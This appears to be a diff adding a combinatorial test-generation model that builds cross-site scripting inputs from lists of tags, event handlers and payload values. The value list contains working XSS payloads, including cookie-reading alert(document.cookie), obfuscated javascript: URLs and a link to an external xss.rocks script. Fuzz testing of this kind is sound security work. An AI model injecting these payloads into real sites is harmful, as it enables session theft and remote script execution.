@@ -1,0 +1,13 @@
+pre : ', !, \, -, >, ;, "
+html : <script>, <img>, <link>, <src>, <object>
+event : onload, onmousemove, onclick, onmouseover, NULL
+equals : =, NULL
+value : alert(XSS), alert(0), "alert(document.cookie)", "background-image: url(&#1;javascript:alert('XSS'))", alert(document.cookie), "http://xss.rocks/xss.js", JaVaScRiPt:alert('XSS'), "javascript:alert(XSS)", java\0script:alert(\"XSS\")>";'
+htmlend : </src>, </script>, </link>, </img>, </object>
+
+
+if [html] = "<script>" then [htmlend] = "</script>";
+if [html] = "<img>" then [htmlend] = "</img>";
+if [html] = "<link>" then [htmlend] = "</link>";
+if [html] = "<src>" then [htmlend] = "</src>";
+if [html] = "<object>" then [htmlend] = "</object>";
